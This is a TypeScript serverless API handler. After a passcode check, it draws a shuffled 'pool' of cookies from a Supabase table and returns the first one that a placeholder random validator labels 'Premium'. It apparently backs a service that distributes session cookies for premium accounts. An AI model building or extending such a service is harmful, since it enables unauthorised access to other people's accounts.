import type { VercelRequest, VercelResponse } from "@vercel/node";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  {
    auth: {
      persistSession: false,
      autoRefreshToken: false,
    },
  }
);

async function isPasscodeValid(passcode: string) {
  const { data, error } = await supabase
    .from("passcodes")
    .select("id, code, is_active, expires_at")
    .eq("code", passcode)
    .eq("is_active", true)
    .maybeSingle();

  if (error) throw new Error(error.message);
  if (!data) return { ok: false, error: "Incorrect passcode." };

  if (data.expires_at && new Date(data.expires_at) <= new Date()) {
    return { ok: false, error: "This passcode has expired." };
  }

  return { ok: true };
}

// Example validation (replace with your own logic)
async function validateItem(item: any) {
  const valid = Math.random() > 0.8;

  return {
    valid,
    plan: valid ? "Premium" : "Unknown Plan",
    countryOfSignup: valid ? "US" : "Unknown Country",
  };
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, error: "Method not allowed" });
    }

    const passcode = String(req.body?.passcode ?? "").trim();

    if (!passcode) {
      return res.status(400).json({ success: false, error: "Passcode is required." });
    }

    const passcodeCheck = await isPasscodeValid(passcode);

    if (!passcodeCheck.ok) {
      return res.status(401).json({ success: false, error: passcodeCheck.error });
    }

    const { data: rows, error } = await supabase
      .from("cookies")
      .select("cookie")
      .order("created_at", { ascending: false });

    if (error) {
      return res.status(500).json({
        success: false,
        error: error.message,
      });
    }

    const items = (rows || []).map((r: any) => r.cookie).filter(Boolean);

    if (!items.length) {
      return res.status(400).json({
        success: false,
        error: "Pool is empty.",
      });
    }

    // shuffle items
    for (let i = items.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [items[i], items[j]] = [items[j], items[i]];
    }

    // scan until first valid
    for (const item of items) {

      const result = await validateItem(item);

      if (result.valid) {
        return res.status(200).json({
          success: true,
          results: [result],
        });
      }

    }

    return res.status(200).json({
      success: false,
      error: "No valid result found.",
    });

  } catch (error: any) {

    console.error("API crash:", error);

    return res.status(500).json({
      success: false,
      error: error?.message || "Unexpected server error",
    });

  }
}
